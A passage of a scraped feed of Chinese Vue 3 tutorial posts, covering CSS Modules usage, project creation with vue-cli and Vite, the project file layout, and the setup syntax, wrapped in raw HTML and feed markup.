<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.title___3ghj2</span> { <span class="hljs-attribute">color</span>: red; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>; }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>2.组件中的 <code>:class="$style.title"</code> 会被转换成这个唯一类名</p>
<h4 data-id="heading-11">父组件传递 CSS Modules </h4>
<p>父组件: </p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">:styles</span>=<span class="hljs-string">"$style"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">module</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.parentTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
  <span class="hljs-attribute">color</span>: green;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>子组件</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"styles.parentTitle"</span>&gt;</span>我是子组件<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>([<span class="hljs-string">"styles"</span>]);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-12"> Vue 组件外部使用 CSS Modules</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">"./style.module.css"</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"styles.box"</span>&gt;</span>外部 CSS Modules<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>style.module.css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.box</span> {
  <span class="hljs-attribute">background-color</span>: yellow;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(1)项目工程创建]]></title>    <link>https://juejin.cn/post/7583973613197361167</link>    <guid>https://juejin.cn/post/7583973613197361167</guid>    <pubDate>2025-12-16T03:42:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973613197361167" data-draft-id="7583971282892472372" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(1)项目工程创建"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:42:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端无涯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(1)项目工程创建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端无涯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:42:24.000Z" title="Tue Dec 16 2025 03:42:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0"> 1.基于vue-cli 创建</h2>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment"># 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上</span></span>
vue --version
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># 安装或者升级你的@vue/cli</span></span> 
npm install -g @vue/cli
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># 执行创建命令</span></span>
vue create vue3_project
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">#  随后选择3.x</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#  Choose a version of Vue.js that you want to start the project with (Use arrow keys)</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#  &gt; 3.x</span></span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#    2.x</span></span>
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment"># 启动</span></span>
cd vue3_project
npm run serve
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-1">2.基于vite创建</h2>
<p><strong>前提条件:</strong></p>
<ul>
<li>熟悉命令行</li>
<li>已安装 18.3 或更高版本的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F" title="https://nodejs.org/" target="_blank" ref="nofollow noopener noreferrer">Node.js</a></li>
</ul>
<p> 运行命令行命令_</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vue<span class="hljs-variable">@latest</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>根据自己项目的实际情况选择配置项,完成项目工程基本配置</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd24e04ece954288a5274dc4a3bd85c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461344&amp;x-signature=9mjZuNWoHNYMk3YkKsfxIlfkk2o%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​</p>
<p><strong>补充提示:</strong></p>
<ul>
<li>推荐的 IDE 配置是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" title="https://code.visualstudio.com/" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a> + <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DVue.volar" title="https://marketplace.visualstudio.com/items?itemName=Vue.volar" target="_blank" ref="nofollow noopener noreferrer">Vue - Official 扩展</a></li>
<li>要了解构建工具 Vite 更多背后的细节，请查看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vitejs.dev%2F" title="https://cn.vitejs.dev/" target="_blank" ref="nofollow noopener noreferrer">Vite 文档</a>。</li>
<li>如果你选择使用 TypeScript，请阅读 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Ftypescript%2Foverview.html" title="https://cn.vuejs.org/guide/typescript/overview.html" target="_blank" ref="nofollow noopener noreferrer">TypeScript 使用指南</a>。 </li>
</ul>
<h2 data-id="heading-2">3.工程文件列表</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cb42aac090e418cb072f61a4e39d22a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5peg5rav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461344&amp;x-signature=AP3r7vZRrAsq82OxOPvFfPxbqcs%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​</p>
<pre><code class="hljs language-csharp" lang="csharp">vue3-project-vite/
│── node_modules/        <span class="hljs-meta"># 依赖库，`npm install` 后生成</span>
│── <span class="hljs-keyword">public</span>/              <span class="hljs-meta"># 静态资源目录，不会被 Vite 处理，直接映射到根目录</span>
│   ├── favicon.ico      <span class="hljs-meta"># 网站图标</span>
│── src/                 <span class="hljs-meta"># 源代码目录（Vue 组件、页面、状态管理等）</span>
│   ├── assets/          <span class="hljs-meta"># 存放静态资源（图片、CSS）</span>
│   ├── components/      <span class="hljs-meta"># 复用组件,常用封装功能组件</span>
│   ├── views/           <span class="hljs-meta"># 主要页面（通常按路由划分）</span>
│   ├── router/          <span class="hljs-meta"># Vue Router 配置,管理页面路由</span>
│   ├── store/           <span class="hljs-meta"># Vuex / Pinia 状态管理</span>
│   ├── App.vue          <span class="hljs-meta"># 根组件,所有页面组件的父组件</span>
│   ├── main.js / main.ts <span class="hljs-meta"># 入口文件，初始化 Vue 实例</span>
│── .gitignore           <span class="hljs-meta"># Git 忽略文件</span>
│── index.html           <span class="hljs-meta"># 入口 HTML 文件</span>
│── package.json         <span class="hljs-meta"># 依赖和脚本配置</span>
│── vite.config.js       <span class="hljs-meta"># Vite 配置文件</span>
│── tsconfig.json        <span class="hljs-meta"># TypeScript 配置（仅 TypeScript 项目）</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>重点区别:</strong> vue3与vue2工程文件区别点最大的地方在于,入口文件vue3是index.html文件,浏览器加载时最先解析,vite处理HTML文件通过
</p><pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">""</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/favicon.ico"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vite App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.ts"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(2)setup]]></title>    <link>https://juejin.cn/post/7583992239102394420</link>    <guid>https://juejin.cn/post/7583992239102394420</guid>    <pubDate>2025-12-16T03:43:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239102394420" data-draft-id="7583992239102378036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(2)setup"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:43:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端无涯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(2)setup
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端无涯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:43:31.000Z" title="Tue Dec 16 2025 03:43:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">概述</h2>
<blockquote>
<p>Vue 3 引入了 <code>setup</code> 语法，使 Composition API 成为核心特性之一。它相比 Options API 提供了更清晰的逻辑组织，提高了代码可维护性。组件中所用到的：数据、方法、计算属性、监视......等等，均配置在<code>setup</code>中。</p>
</blockquote>
<h2 data-id="heading-1">基本语法 </h2>
<h4 data-id="heading-2"><strong>传统 <code>setup</code></strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">name</span>:<span class="hljs-string">'Test'</span>,
    <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>){
      <span class="hljs-comment">// 数据(vue2 写在data中)</span>
      <span class="hljs-keyword">let</span> name = <span class="hljs-string">'张三'</span>
      <span class="hljs-keyword">let</span> age = <span class="hljs-number">18</span>
      <span class="hljs-comment">// 方法(vue2 写在method中)</span>
      <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>){
        name = <span class="hljs-string">'zhang-san'</span> <span class="hljs-comment">//注意：此时这么修改name页面是不变化的</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name)
      }
      <span class="hljs-comment">// 返回一个对象，对象中的内容，模板中可以直接使用</span>
      <span class="hljs-keyword">return</span> {name,age,test}
    }
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>注意:setup返回值如果返回一个对象,那么对象的属性方法都可以在模板中使用,但是如果返回一个函数,则可以自定义渲染内容</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">setup</span>(<span class="hljs-params"/>){
 <span class="hljs-keyword">return</span> <span class="hljs-function">()=&gt;</span><span class="hljs-string">'自定义文字显示'</span>
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-3"><strong><code>&lt;script setup&gt;</code></strong></h4>
<blockquote>
<p>不需要 <code>return</code>，变量和方法会自动暴露给 <code>template</code></p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">

  <span class="hljs-comment">// 数据</span>
  <span class="hljs-keyword">let</span> name = <span class="hljs-string">'张三'</span>
  <span class="hljs-keyword">let</span> age = <span class="hljs-number">18</span>
  <span class="hljs-comment">// 方法</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>){
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>扩展：上述代码，还需要编写一个不写<code>setup</code>的<code>script</code>标签，去指定组件名字，比较麻烦，我们可以借助<code>vite</code>中的插件简化</p>
<ol>
<li><code>npm i vite-plugin-vue-setup-extend -D</code></li>
<li><code>vite.config.ts</code>中使用插件</li>
<li><code>&lt;script setup lang="ts" name="Person"&gt;</code></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueSetupName</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-vue-setup-extend'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [ <span class="hljs-title class_">VueSetupName</span> () ]
})
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-4"/>
<h2 data-id="heading-5">执行时机</h2>
<ul>
<li><strong>在 <code>beforeCreate</code> 之前执行</strong></li>
<li><strong>不能访问 <code>this</code></strong>（因为 <code>this</code> 还未初始化,this输出为undefined）</li>
<li><strong>只能在 <code>&lt;script setup&gt;</code> 或 <code>setup()</code> 中使用</strong></li>
</ul>
<h2 data-id="heading-6"> 重点</h2>
<ol>
